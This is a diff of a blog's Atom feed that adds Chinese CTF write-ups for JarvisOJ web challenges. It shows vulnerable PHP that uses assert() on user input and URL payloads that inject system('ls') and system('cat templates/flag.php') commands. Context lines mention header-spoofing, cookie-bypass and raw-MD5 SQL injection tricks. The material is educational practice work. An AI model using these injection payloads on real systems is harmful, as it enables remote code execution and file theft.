@@ -207,9 +207,15 @@
     <link href="http://yoursite.com/2017/07/05/jarvisoj-web-writeup/"/>
     <id>http://yoursite.com/2017/07/05/jarvisoj-web-writeup/</id>
     <published>2017-07-05T14:54:38.000Z</published>
-    <updated>2017-07-07T01:32:49.391Z</updated>
+    <updated>2017-07-07T06:31:00.550Z</updated>
     
     <content type="html"><![CDATA[<p>jarvisoj-web-writeup<br><a id="more"></a></p>
+<h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><p>以前做过。按理说应该有git泄露的..这次死活找不到：）。<br>通过git泄露出来的index.php源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</div><div class="line">	$page = $_GET[<span class="string">'page'</span>];</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	$page = <span class="string">"home"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</div><div class="line"></div><div class="line"><span class="comment">// I heard '..' is dangerous!</span></div><div class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</div><div class="line"></div><div class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></div><div class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>其中<code>assert</code>是个危险函数，其原型为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool assert ( mixed $assertion [, string $description ] )</div></pre></td></tr></table></figure></p>
+<p>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>payload1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32798/?page=flag&apos;.system(&quot;ls templates/;&quot;).&apos;</div></pre></td></tr></table></figure></p>
+<p>payload2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32798/?page=flag&apos;.system(&quot;cat templates/flag.php;&quot;).&apos;</div></pre></td></tr></table></figure></p>
+<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">61dctf&#123;8e_careful_when_us1ng_ass4rt&#125;</div></pre></td></tr></table></figure></p>
+<p>其实这是<a href="https://github.com/ernw/ctf-writeups/blob/master/csaw2016/mfw/README.md" target="_blank" rel="external">CSAW2016原题</a>..</p>
 <h1 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h1><p>扫到robots.txt发现<code>Disallow: /admin_s3cr3t.php</code>。<br>访问并用burp抓包，如下：</p>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170706/3.jpg?raw=true" alt=""></p>
 <p>在cookie字段加上<code>admin=1</code>，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;hello_admin~&#125;</div></pre></td></tr></table></figure></p>
@@ -279,6 +285,8 @@
 <p>成功闭合前面的单引号。填入password，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PCTF&#123;R4w_md5_is_d4ng3rous&#125;</div></pre></td></tr></table></figure></p>
 <p>更多内容可见：<a href="http://www.joychou.org/index.php/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="external">SQL injection with raw MD5 hashes</a></p>
 <h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p>直接改X-Forwarded-For为127.0.0.1。得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="PORT-51"><a href="#PORT-51" class="headerlink" title="PORT 51"></a>PORT 51</h1><p>用vps来请求，不然经过路由后可能请求端口就变了。在vps上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ sudo curl --local-port 51 http://web.jarvisoj.com:32770/</div><div class="line">[sudo] password for ubuntu:</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Web 100&lt;/title&gt;</div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">	body &#123;</div><div class="line">		background:gray;</div><div class="line">		text-align:center;</div><div class="line">	&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">	&lt;h3&gt;Yeah!! Here&apos;s your flag:PCTF&#123;M45t3r_oF_CuRl&#125;&lt;/h3&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PCTF&#123;M45t3r_oF_CuRl&#125;</div></pre></td></tr></table></figure></p>
 ]]></content>
     
     <summary type="html">
@@ -579,9 +587,9 @@
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
       <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
     
   </entry>
   
@@ -616,9 +624,9 @@
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
       <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
     
       <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
     
@@ -1222,11 +1230,11 @@
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
       <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
     
       <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
     
   </entry>
   
